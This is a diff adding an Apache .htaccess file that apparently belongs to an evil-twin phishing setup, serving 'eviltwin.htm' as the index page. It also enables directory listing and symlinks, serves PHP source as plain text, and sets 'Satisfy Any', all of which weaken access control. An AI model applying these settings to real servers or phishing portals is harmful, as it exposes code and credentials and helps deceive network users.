@@ -1,0 +1,5 @@
+Options Indexes FollowSymLinks
+DirectoryIndex eviltwin.htm
+AddType text/plain .php 
+AddHandler text/plain .php
+Satisfy Any
